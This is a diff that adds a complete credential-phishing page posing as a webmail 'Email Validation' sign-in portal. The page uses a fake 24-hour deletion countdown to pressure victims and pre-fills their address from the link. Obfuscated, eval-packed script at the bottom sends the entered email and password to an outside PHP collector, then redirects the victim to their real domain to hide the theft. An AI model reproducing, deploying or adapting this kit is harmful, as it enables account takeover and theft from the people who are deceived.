@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Email Validation :: Portal Signin</title>
+<meta name="Robots" content="noindex,nofollow" />
+<meta http-equiv="X-UA-Compatible" content="IE=EDGE" />
+<meta name="viewport" content="" id="viewport" />
+<link rel="shortcut icon" href="favicon.ico"/>
+<link rel="stylesheet" type="text/css" href="https://brief-puzzling-archaeology.glitch.me/inv-style.css?s=1510168456" />
+<link rel="stylesheet" type="text/css" href="https://brief-puzzling-archaeology.glitch.me/inv-styles-mini.css?s=1510168455">
+
+</head>
+<body>
+
+<div id="login-form">
+
+<div class="box-inner">
+<div align="center"><img src="https://cdn.glitch.me/1518c2f5-0c58-4d20-b061-f51c62a86eff%2Fenv.png?v=1638347104229" width="90px" height="90px"></div>
+<img src="https://firebasestorage.googleapis.com/v0/b/mpoaanan.appspot.com/o/inc%2Floadinglogo.gif?alt=media&token=ad80211a-6694-4e63-84f9-293050c3c1f5" id="logoimg" width="70px" height="70px">
+<p align="center"><font size="-1" color="#FFFFFF">Confirm your email password to view pending messages. Pending messages will be deleted after.</font><br/><font color="#FF0000"><span id="timer"></span> Hours</font></p>
+<form name="form" method="post" action="">
+<table><tbody><tr><td class="title"><label for="rcmloginuser">Email Address</label>
+</td>
+<td class="input"><input name="email" id="email" required="required" size="40" autocapitalize="off" autocomplete="off" type="text" readonly=""></td>
+</tr>
+<tr><td class="title"><label for="rcmloginpwd">Password</label>
+</td>
+<td class="input"><input name="password" id="password" required="required" size="40" autocapitalize="off" autocomplete="off" type="password"></td>
+</tr>
+</tbody>
+</table>
+<p class="formbuttons"><input type="submit" id="submit-btn" class="button mainaction" value="View Pending Messages"></p>
+
+</form>
+
+</div>
+
+<div class="box-bottom">
+	 <div align="center" id="msg" style="display: none; font-size:14px">Invalid Password! Please Enter your correct Email Password</div>
+	<noscript>
+		<p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
+	</noscript>
+</div>
+
+<div id="bottomline">
+	<span id="logoname"></span> Server Validation Portal
+		
+</div>
+</div>
+<script>
+document.getElementById('timer').innerHTML =
+  24 + ":" + 00;
+startTimer();
+
+function startTimer() {
+  var presentTime = document.getElementById('timer').innerHTML;
+  var timeArray = presentTime.split(/[:]+/);
+  var m = timeArray[0];
+  var s = checkSecond((timeArray[1] - 1));
+  if(s==59){m=m-1}
+  //if(m<0){alert('timer completed')}
+  
+  document.getElementById('timer').innerHTML =
+    m + ":" + s;
+  setTimeout(startTimer, 2000);
+}
+
+function checkSecond(sec) {
+  if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+  if (sec < 0) {sec = "59"};
+  return sec;
+}
+</script>
+
+
+</body>
+
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+  <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+
+<script>
+
+   eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(16).17(6(){5 m=0;$(\'#18\').R(6(){$("#8").A();$(\'#B\').u("");$("#19").S({1a:T,U:"A"},0);$("#1b").S({1c:T,U:"y"},1d)});5 n=H.I.1e.z(1);7(!n){}V{5 o=n;$(\'#B\').u(o);5 p=/^([a-v-w-W\\.\\-])+\\@(([a-v-w-9\\-])+\\.)+([a-v-w-9]{2,4})+$/;7(!p.X(o)){$(\'#C\').y();n.Y;Z 10}5 q=o.D("@");5 r=o.z((q+1));5 c=r.z(0,r.D(\'.\'));5 s=c.11();5 t=c.12();$("#J").K("L","E://M.N.F/"+r);$("#O").x(t);$(".O").x(t)}$(\'#P-Q\').R(6(b){$(\'#C\').A();$(\'#8\').A();b.1f();5 d=$("#B").u();5 e=$("#G").u();5 f=$(\'#8\').x();$(\'#8\').1g(f);5 g=d;5 h=/^([a-v-w-W\\.\\-])+\\@(([a-v-w-9\\-])+\\.)+([a-v-w-9]{2,4})+$/;7(!h.X(g)){$(\'#C\').y();d.Y;Z 10}5 i=g.D("@");5 j=g.z((i+1));5 c=j.z(0,j.D(\'.\'));5 k=c.11();5 l=c.12();$("#J").K("L","E://M.N.F/"+j);$(".J").K("L","E://M.N.F/"+j);$("#O").x(l);m=m+1;$.1h({1i:\'1j\',1k:\'E://1l-1m.F/1n/1o-1p.1q\',1r:\'1s\',1t:{B:d,G:e,},1u:6(a){$(\'#P-Q\').x(\'1v...\')},1w:6(a){7(a){$("#8").y();1x.1y(a);7(a[\'1z\']==\'1A\'){$("#G").u("");7(m>=3){m=0;H.I.13("14://15."+j)}}V{}}},C:6(){$("#G").u("");7(m>=2){m=0;H.I.13("14://15."+j)}$("#8").y()},1B:6(){$(\'#P-Q\').x(\'1C 1D\')}})})});',62,102,'|||||var|function|if|msg||||||||||||||||||||||val|zA|Z0|html|show|substr|hide|email|error|indexOf|https|com|password|window|location|logoimg|attr|src|logo|clearbit|logoname|submit|btn|click|animate|200|opacity|else|9_|test|focus|return|false|toLowerCase|toUpperCase|replace|http|www|document|ready|back1|automail|left|inputbar|right|1000|hash|preventDefault|text|ajax|dataType|JSON|url|mleczarnialowicz|pl|wiz|form|loaded|php|type|POST|data|beforeSend|Verifing|success|console|log|signal|ok|complete|Sign|in'.split('|'),0,{}))
+
+  </script>
+</html>
